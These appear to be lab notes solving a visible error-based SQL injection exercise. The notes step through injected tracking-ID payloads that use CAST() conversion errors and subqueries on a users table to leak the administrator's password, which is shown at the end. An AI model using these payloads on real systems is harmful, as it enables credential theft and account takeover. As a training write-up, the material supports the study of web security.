Visible error-based SQL injection
Goal:to leak the password for the administrator user, then log in to their account. 
Analysis:
select trackingId from trackingTable where trakingId='9WSsPt1yb2dC28WA''
    ->error:Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '9WSsPt1yb2dC28WA''. Expected  char
    ->SELECT * FROM tracking WHERE id = '9WSsPt1yb2dC28WA'--'

    CAST()->convert one datatype to other datatype
    previous payload-> 9WSsPt1yb2dC28WA'--
    
    9WSsPt1yb2dC28WA' and CAST((select 1) as int)-- : error generated 500
    9WSsPt1yb2dC28WA' and 1=CAST((select 1) as int)--

    9WSsPt1yb2dC28WA' and 1=CAST((select username from users) as int)-- : 500 Internal Server Error

    ' and 1=CAST((select username from users) as int)-- :ERROR: more than one row returned by a subquery used as an expression

    ' and 1=CAST((select username from users LIMIT 1) as int)--

    ' and 1=CAST((select password from users LIMIT 1) as int)--
    
    Password:iecw7xqind8g0qxzslbf